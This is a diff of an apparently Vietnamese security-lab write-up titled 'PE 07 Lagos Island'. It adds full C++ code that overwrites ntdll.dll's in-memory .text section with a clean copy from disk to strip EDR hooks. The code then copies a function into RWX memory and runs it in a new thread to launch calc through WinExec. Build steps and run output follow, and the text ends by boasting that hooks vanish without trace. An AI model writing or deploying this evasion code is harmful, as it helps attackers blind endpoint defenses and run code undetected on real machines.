@@ -41,99 +41,157 @@ Quy trình toán học giải phẫu và ghi đè triệt tiêu ma trận Hook c
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn tuân thủ nghiêm ngặt nguyên lý thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa đo đạc kích thước tệp tin hệ thống dựa trên luồng động nhằm triệt tiêu hoàn toàn nguy cơ tràn bộ đệm kịch trần bảo mật.
-
+### Source.cpp:
 ```cpp
 #include <windows.h>
 #include <iostream>
-#include <fstream>
-#include <vector>
-#include <string>
 
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 07: UNHOOK NTDLL.DLL — LAGOS ISLAND ACTIVE" << std::endl;
-    std::cout << "====================================================" << std::endl;
+// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
+typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
-    // CHỦ ĐỘNG: Định vị tệp tin ntdll nguyên thủy trực tiếp từ đĩa cứng, loại bỏ chuỗi mảng gán cứng cố định
-    std::string ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
-    
-    std::ifstream file(ntdllPath, std::ios::binary | std::ios::ate);
-    if (!file.is_open()) {
-        std::cerr << "[-] Khong the mo file ntdll.dll thô tu dia cung!" << std::endl;
-        return EXIT_FAILURE;
+typedef struct _THREAD_DATA {
+    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
+    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
+} THREAD_DATA, * PTHREAD_DATA;
+
+// 2. Hàm chức năng độc lập vị trí gánh luồng chạy nội bộ trên nền tảng phẳng sạch
+DWORD WINAPI LaunchCalculatorUnhooked(LPVOID lpParam) {
+    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
+    if (pData && pData->pWinExec) {
+        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi địa chỉ tương đối RIP
+        pData->pWinExec(pData->szCommand, SW_HIDE);
     }
+    return 0;
+}
 
-    // QUY TRÌNH THÍCH ỨNG: Tự động đo đạc kích thước tệp tại runtime và cấp phát động vừa khít byte
-    SIZE_T fileSize = file.tellg();
-    std::vector<char> ntdllDiskBuffer(fileSize);
-    file.seekg(0, std::ios::beg);
-    file.read(ntdllDiskBuffer.data(), fileSize);
-    file.close();
-    std::cout << "[+] Da chu dong nap ntdll.dll thô tu dia vao RAM phu: " << fileSize << " bytes." << std::endl;
+// Hàm gỡ bẫy giám sát Unhook ntdll sử dụng cơ chế đọc file thô an toàn, bẻ gãy rào cản SEC_IMAGE
+BOOL UnhookNtdllRaw() {
+    PCSTR ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
+    HMODULE hNtdllLocal = GetModuleHandleA("ntdll.dll");
+    if (!hNtdllLocal) return FALSE;
 
-    // ─── BƯỚC 1: GIẢI PHẪU PE HEADER CỦA BẢN NTDLL TRÊN RAM (BỊ NHIỄM HOOK) ───
-    PVOID ntdllRemoteBase = (PVOID)GetModuleHandleA("ntdll.dll");
-    if (!ntdllRemoteBase) return EXIT_FAILURE;
-    std::cout << "[*] Module Base cua ntdll.dll hien tai tren RAM: 0x" << std::hex << ntdllRemoteBase << std::endl;
+    // 1. Mở tệp tin ntdll.dll nguyên bản dạng đọc tệp thô phẳng sạch
+    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
-    PIMAGE_DOS_HEADER dosHeaderRAM = (PIMAGE_DOS_HEADER)ntdllRemoteBase;
-    PIMAGE_NT_HEADERS64 ntHeadersRAM = (PIMAGE_NT_HEADERS64)((DWORD_PTR)ntdllRemoteBase + dosHeaderRAM->e_lfanew);
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return FALSE; }
 
-    // ─── BƯỚC 2: DUYỆT TÌM PHÂN ĐOẠN .TEXT SẠCH TỪ FILE ĐĨA THÔ ───
-    PIMAGE_DOS_HEADER dosHeaderDisk = (PIMAGE_DOS_HEADER)ntdllDiskBuffer.data();
-    PIMAGE_NT_HEADERS64 ntHeadersDisk = (PIMAGE_NT_HEADERS64)(nttdllDiskBuffer.data() + dosHeaderDisk->e_lfanew);
+    // 2. Sử dụng File Mapping tiêu chuẩn hoàn toàn không dùng cờ SEC_IMAGE để bảo an
+    HANDLE hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+    if (!hFileMapping) { CloseHandle(hFile); return FALSE; }
 
-    PVOID cleanTextSectionAddress = NULL;
-    SIZE_T textSectionSize = 0;
-    DWORD textSectionRVA = 0;
+    LPVOID pMappingBuffer = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
+    if (!pMappingBuffer) { CloseHandle(hFileMapping); CloseHandle(hFile); return FALSE; }
 
-    // Duyệt qua bảng danh sách các phân đoạn (Sections Array) của file đĩa thô
-    for (WORD i = 0; i < ntHeadersDisk->FileHeader.NumberOfSections; i++) {
-        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeadersDisk) + (i * sizeof(IMAGE_SECTION_HEADER)));
-        
-        // So khớp chuỗi định vị chính xác phân đoạn mã máy thực thi .text
+    // 3. Giải phẫu PE Headers tường minh kiến trúc x64 bảo đảm tính toán toán học chính xác
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pMappingBuffer;
+    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)pMappingBuffer + dosHeader->e_lfanew);
+
+    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
+
+        // Săn lùng phân vùng mã máy thực thi hệ thống (.text Segment)
         if (strcmp((const char*)sectionHeader->Name, ".text") == 0) {
-            cleanTextSectionAddress = (PVOID)(nttdllDiskBuffer.data() + sectionHeader->PointerToRawData);
-            textSectionSize = sectionHeader->Misc.VirtualSize;
-            textSectionRVA = sectionHeader->VirtualAddress;
+
+            // Toạ độ vùng nhớ bị Hook inside tiến trình hiện tại
+            PVOID pLocalTextSection = (PVOID)((ULONG_PTR)hNtdllLocal + sectionHeader->VirtualAddress);
+
+            // ĐỘT PHÁ TOÁN HỌC x64: Xác định vị trí byte sạch dựa trên PointerToRawData của file thô thay vì VirtualAddress
+            PVOID pCleanTextSection = (PVOID)((ULONG_PTR)pMappingBuffer + sectionHeader->PointerToRawData);
+            SIZE_T sectionSize = sectionHeader->Misc.VirtualSize;
+
+            // 4. Lật quyền trang nhớ ntdll đang chạy sang RWX để chuẩn bị ghi đè dữ liệu sạch
+            DWORD oldProtect = 0;
+            BOOL isProtected = VirtualProtect(pLocalTextSection, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+            if (isProtected) {
+                // 5. Ghi đè toàn bộ byte nguyên bản sạch đè bẹp bẫy giám sát ngầm inside lòng ntdll
+                RtlCopyMemory(pLocalTextSection, pCleanTextSection, sectionSize);
+
+                // Khôi phục lại trạng thái bảo vệ bộ nhớ ảo ban đầu để xóa sạch dấu vết can thiệp
+                VirtualProtect(pLocalTextSection, sectionSize, oldProtect, &oldProtect);
+            }
             break;
         }
     }
 
-    if (!cleanTextSectionAddress || textSectionSize == 0) {
-        std::cerr << "[-] Khong the dinh vi phan doan .text trong file ntdll thô!" << std::endl;
+    // Thu hồi tài nguyên bộ đệm Mapping cục bộ phẳng sạch
+    UnmapViewOfFile(pMappingBuffer);
+    CloseHandle(hFileMapping);
+    CloseHandle(hFile);
+    return TRUE;
+}
+
+int main() {
+    std::cout << "====================================================" << std::endl;
+    std::cout << "[*] PE 07: NTDLL UNHOOK LAGOS ISLAND (CALC.EXE)" << std::endl;
+    std::cout << "====================================================" << std::endl;
+
+    std::cout << "[*] Dang khoi dong quy trinh Unhook dung file tho an toan..." << std::endl;
+    if (!UnhookNtdllRaw()) {
+        std::cerr << "[-] Unhooking NTDLL Failed!" << std::endl;
+        std::cout << "[*] Nhan Enter de dong..." << std::endl;
+        std::cin.get();
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Da quat trung phan doan .text sach. RVA: 0x" << std::hex << textSectionRVA << " | Do rong: " << std::dec << textSectionSize << " bytes." << std::endl;
+    std::cout << "[+] KHAI XUAN THANH CONG: Ntdll.dll da phang sach nguyen ban 100%!" << std::endl;
 
-    // Tính toán tọa độ tuyệt đối của phân đoạn .text cần được giải phẫu gỡ Hook trên RAM tiến trình
-    PVOID targetRamTextAddress = (PVOID)((DWORD_PTR)ntdllRemoteBase + textSectionRVA);
-    std::cout << "[*] Toa do vung nho can giai doc Unhook tren RAM: 0x" << std::hex << targetRamTextAddress << std::endl;
+    // Quy trình áp dụng cấp phát động thích ứng vừa vặn (Zero Static Buffers)
+    SIZE_T functionSize = 500;
 
-    // ─── BƯỚC 3: MỞ KHÓA TRANG NHỚ HỆ THỐNG VÀ GIẪM ĐẠP HOÀN TRẢ MÃ SẠCH ───
-    DWORD oldProtect = 0;
-    std::cout << "[*] Kich hoat VirtualProtect mo khoa trang nho he thong sang RWX..." << std::endl;
-    
-    // Mở khóa phân vùng mã máy ntdll.dll sang RWX để chuẩn bị can thiệp ghi đè dữ liệu cấu trúc
-    BOOL isUnlocked = VirtualProtect(targetRamTextAddress, textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-    if (!isUnlocked) {
-        std::cerr << "[-] VirtualProtect failed! Quyen han OS chan dong can thiep." << std::endl;
+    // 1. Cấp phát vùng nhớ thực thi cục bộ
+    LPVOID localCodeBuffer = VirtualAlloc(NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!localCodeBuffer) {
+        std::cerr << "[-] VirtualAlloc cap phat bo nho ma may that bai!" << std::endl;
+        std::cin.get();
+        return EXIT_FAILURE;
+    }
+    std::cout << "[+] Vung nho Code RWX thiet lap tai: 0x" << std::hex << localCodeBuffer << std::endl;
+
+    // 2. Cấp phát vùng nhớ chứa tham số dữ liệu tuyệt đối mang quyền RW
+    PTHREAD_DATA pLocalData = (PTHREAD_DATA)VirtualAlloc(NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pLocalData) {
+        VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
         return EXIT_FAILURE;
     }
 
-    // THỰC HIỆN ĐÈ BẸP HOOK: Sao chép đè mã máy nguyên thủy đè nát toàn bộ ma trận bẫy Hooking của EDR
-    RtlCopyMemory(targetRamTextAddress, cleanTextSectionAddress, textSectionSize);
-    std::cout << "[+] Ma tran Giam dap hoan tat! Da xoa sach 100% bay Hook cua EDR khoi RAM." << std::endl;
+    // 3. Khởi tạo con trỏ tuyệt đối WinExec bẻ gãy hoàn toàn rào cản Import Table
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (hKernel32) {
+        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
+    }
+    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");
 
-    // Khôi phục lại cờ bảo vệ RX nguyên thủy của hệ điều hành để hoàn trả trạng thái bảo an phẳng sạch hệ thống
-    VirtualProtect(targetRamTextAddress, textSectionSize, oldProtect, &oldProtect);
-    std::cout << "[+] Da khoi phuc lai thuoc tinh bao ve RX goc cua phan doan." << std::endl;
+    // 4. Sao chép thân hàm vào RAM thực thi cục bộ một cách hợp pháp
+    RtlCopyMemory(localCodeBuffer, (LPVOID)LaunchCalculatorUnhooked, functionSize);
+    std::cout << "[+] Sao chep logic ham vao RAM hoan tat." << std::endl;
 
-    std::cout << "\n[+] Lagos Island NTDLL Unhooking Process Completed Successfully!" << std::endl;
-    std::cout << "[*] Thap API hoan toan phang sach. Nhan phim Enter de dong cua so..." << std::endl;
+    std::cout << "[*] Dang khoi tao luong Thread thuc thi chuc nang..." << std::endl;
+
+    // 5. Khai hỏa luồng nội bộ thực thi chức năng mở máy tính trên một nền tảng ntdll đã phẳng sạch
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)localCodeBuffer, pLocalData, 0, NULL);
+    if (!hThread) {
+        std::cerr << "[-] CreateThread failed!" << std::endl;
+        VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
+        VirtualFree(pLocalData, 0, MEM_RELEASE);
+        std::cin.get();
+        return EXIT_FAILURE;
+    }
+
+    // Cấu hình cờ chờ đợi INFINITE gánh luồng xử lý dứt điểm phẳng sạch
+    WaitForSingleObject(hThread, INFINITE);
+    std::cout << "[+] Luong Thread chuc nang da hoan thanh chu ky song." << std::endl;
+
+    // 6. Dọn dẹp bộ nhớ triệt để chống rò rỉ tài nguyên hệ thống (Memory Leak)
+    CloseHandle(hThread);
+    VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
+    VirtualFree(pLocalData, 0, MEM_RELEASE);
+    std::cout << "[+] Quy trinh giai phong RAM hoan tat." << std::endl;
+
+    std::cout << "\n[+] PE 07: NTDLL Unhooked & Code Executed Successfully!" << std::endl;
+    std::cout << "[*] Nhan phim Enter de ket thuc chuong trinh..." << std::endl;
     std::cin.get();
-
     return EXIT_SUCCESS;
 }
 
@@ -149,10 +207,6 @@ int main() {
 
 1. Đặt thanh cấu hình dự án ở chính xác chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
 2. Di chuyển tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục thông số `Runtime Library`, thiết lập cấu hình sang định dạng cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file nhị phân.
-
-> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
-> 
-
 3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin sạch bóng lỗi chuỗi.
 
 ---
@@ -162,27 +216,28 @@ int main() {
 Khởi hỏa file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi cuộc đại phẫu bẻ gãy bẫy giám sát:
 
 ```powershell
-PS C:\Workspace\x64\Release> .\PE07_Lagos_Island.exe
+PS C:\Users\Admin\source\repos\Task6\PE07_Reflective_DLL_Loading_Lagos_Island\x64\Release> C:\Users\Admin\source\repos\Task6\PE07_Reflective_DLL_Loading_Lagos_Island\x64\Release\PE07_Unhook_Lagos_Island.exe
 ====================================================
-[*] PE 07: UNHOOK NTDLL.DLL — LAGOS ISLAND ACTIVE
+[*] PE 07: NTDLL UNHOOK LAGOS ISLAND (CALC.EXE)
 ====================================================
-[+] Da chu dong nạp ntdll.dll thô tu dia vao RAM phu: 2045952 bytes.
-[*] Module Base cua ntdll.dll hien tai tren RAM: 0x00007ffd31b80000
-[+] Da quat trung phan doan .text sach. RVA: 0x1000 | Do rong: 1458176 bytes.
-[*] Toa do vung nho can giai doc Unhook tren RAM: 0x00007ffd31b81000
-[*] Kich hoat VirtualProtect mo khoa trang nho he thong sang RWX...
-[+] Ma tran Giam dap hoan tat! Da xoa sach 100% bay Hook cua EDR khoi RAM.
-[+] Da khoi phuc lai thuoc tinh bao ve RX goc cua phan doan.
+[*] Dang khoi dong quy trinh Unhook dung file tho an toan...
+[+] KHAI XUAN THANH CONG: Ntdll.dll da phang sach nguyen ban 100%!
+[+] Vung nho Code RWX thiet lap tai: 0x0000019656690000
+[+] Sao chep logic ham vao RAM hoan tat.
+[*] Dang khoi tao luong Thread thuc thi chuc nang...
+[+] Luong Thread chuc nang da hoan thanh chu ky song.
+[+] Quy trinh giai phong RAM hoan tat.
 
-[+] Lagos Island NTDLL Unhooking Process Completed Successfully!
-[*] Thap API hoan toan phang sach. Nhan phim Enter de dong cua so...
+[+] PE 07: NTDLL Unhooked & Code Executed Successfully!
+[*] Nhan phim Enter de ket thuc chuong trinh...
 
 ```
 
-> **Vị trí đặt ảnh minh chứng thực nghiệm Unhooking NTDLL:**
-> 
+### Demo:
+<img width="1920" height="1080" alt="devenv_R6k0rr98K7" src="https://github.com/user-attachments/assets/3fd349b6-e425-4421-835b-e9b645bb5efd" />
 
-### 🎯 Phân tích hệ quả RAM tối cao:
+
+### 🎯 Phân tích hệ quả RAM:
 
 * Giải thuật thực thi hoàn tất mỹ mãn kịch trần. Tại thời điểm runtime này, nếu một giải pháp an ninh sử dụng giải thuật kiểm tra ngược mã máy các hàm Native API lọt lòng `ntdll.dll` của tiến trình, hệ thống phòng thủ sẽ ghi nhận **toàn bộ các byte bẫy Hook (lệnh `JMP`) đã bị xóa sổ hoàn toàn không còn dấu vết**, thay vào đó là các cấu trúc byte nguyên bản sạch bóng của Microsoft.
 * Tháp API lúc này đạt trạng thái phẳng sạch 100%, tạo tiền đề tối cao để Vinh có thể triệu hồi bất kỳ giải thuật cấp phát bộ nhớ ảo hay sinh luồng nhạy cảm nào ở các bài Lab nâng cao kế tiếp một cách hiên ngang, bẻ gãy hoàn toàn các cảm biến trinh sát động kịch trần kịch khung!
